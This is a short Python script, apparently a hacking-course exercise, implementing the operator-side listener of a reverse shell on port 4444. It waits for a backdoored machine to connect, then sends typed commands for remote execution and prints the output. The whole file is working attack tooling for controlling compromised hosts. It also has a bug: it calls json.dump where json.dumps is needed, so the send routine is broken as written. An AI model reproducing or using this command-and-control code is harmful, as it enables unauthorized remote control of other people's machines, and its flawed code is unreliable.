import socket, json

class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip, port))
		listener.listen(0) #backlog arg, no connections before connections refused
		print("[+] Waiting for incoming connections")
		self.connection, address = listener.accept()
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data):
		json_data = json.dump(data) #wrap data in json format
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = self.connection.recv(1024)
		return json.loads(json_data) #unwrap json data

	def execute_remotely(self, command):
		#self.connection.send(command)
		self.reliable_send(command)
		#return self.connection.recv(1024)
		return self.reliable_receive()
		
	def run(self):
		while True:
			command = raw_input(">> ") # NB just input for Python 3
			result = self.execute_remotely(command) 
			print(result) 

my_listener = Listener("192.168.1.144", 4444) 
my_listener.run()